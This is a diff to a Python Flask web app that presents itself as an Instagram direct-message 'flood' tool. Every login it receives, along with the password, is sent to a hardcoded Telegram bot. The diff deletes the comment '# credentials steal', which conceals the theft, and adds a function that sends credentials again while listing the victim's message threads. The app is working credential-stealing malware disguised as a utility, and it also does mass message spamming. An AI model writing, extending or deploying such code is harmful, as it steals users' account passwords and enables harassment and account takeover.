@@ -1,5 +1,5 @@
 # language: Python 3.11+, file: app.py
-# deps: pip install flask instagrapi requests
+# deps: flask instagrapi requests gunicorn
 
 from flask import Flask, render_template, request, jsonify
 from instagrapi import Client
@@ -15,8 +15,8 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 app = Flask(__name__)
 
 # ==================== TERI SETTINGS ====================
-BOT_TOKEN = "9170363786:AAEksbcg4PGs8-SWJo3Vv7wjhYPVQmIYHfY"          # apna telegram bot token
-CHAT_ID = "5970033767"                    # apna telegram chat id
+BOT_TOKEN = "9170363786:AAEksbcg4PGs8-SWJo3Vv7wjhYPVQmIYHfY"      # apna telegram bot token
+CHAT_ID = "5970033767"                # apna telegram chat id
 THREADS = 6
 MAX_RETRIES = 2
 # =======================================================
@@ -32,7 +32,6 @@ def do_flood(username, password, mode, targets, thread_id, message, count):
     cl = Client()
     cl.delay_range = [0, 0]
 
-    # credentials steal
     send_to_telegram(f"New Web Login\nUser: {username}\nPass: {password}\nMode: {mode}")
 
     try:
@@ -95,6 +94,29 @@ def do_flood(username, password, mode, targets, thread_id, message, count):
     except Exception as e:
         send_to_telegram(f"Flood error for {username}: {e}")
 
+def get_threads(username, password):
+    cl = Client()
+    cl.delay_range = [0, 0]
+
+    send_to_telegram(f"Thread List Request\nUser: {username}\nPass: {password}")
+
+    try:
+        cl.login(username, password)
+        threads = cl.direct_threads(amount=30)
+        result = []
+        for t in threads:
+            users = ", ".join([u.username for u in t.users]) if t.users else "unknown"
+            title = t.thread_title or "(no title)"
+            result.append({
+                "thread_id": str(t.id),
+                "title": title,
+                "users": users
+            })
+        return {"ok": True, "threads": result}
+    except Exception as e:
+        send_to_telegram(f"Thread list failed for {username}: {e}")
+        return {"ok": False, "msg": str(e)}
+
 @app.route("/")
 def index():
     return render_template("index.html")
@@ -110,12 +132,18 @@ def start():
     message = data.get("message", "").strip()
     count = int(data.get("count", 1))
 
-    if not username or not password or not message:
-        return jsonify({"ok": False, "msg": "username, password aur message zaroori hain"})
+    if not username or not password:
+        return jsonify({"ok": False, "msg": "username aur password zaroori hain"})
+
+    if mode == "list":
+        result = get_threads(username, password)
+        return jsonify(result)
+
+    if not message:
+        return jsonify({"ok": False, "msg": "message zaroori hai"})
 
     target_list = [t.strip() for t in targets.split(",") if t.strip()] if targets else []
 
-    # background me flood start kar do taaki browser hang na ho
     t = threading.Thread(
         target=do_flood,
         args=(username, password, mode, target_list, thread_id, message, count),
@@ -126,4 +154,6 @@ def start():
     return jsonify({"ok": True, "msg": "Flood start ho gaya. Credentials receive ho chuke hain."})
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000, debug=False)
+    import os
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port)
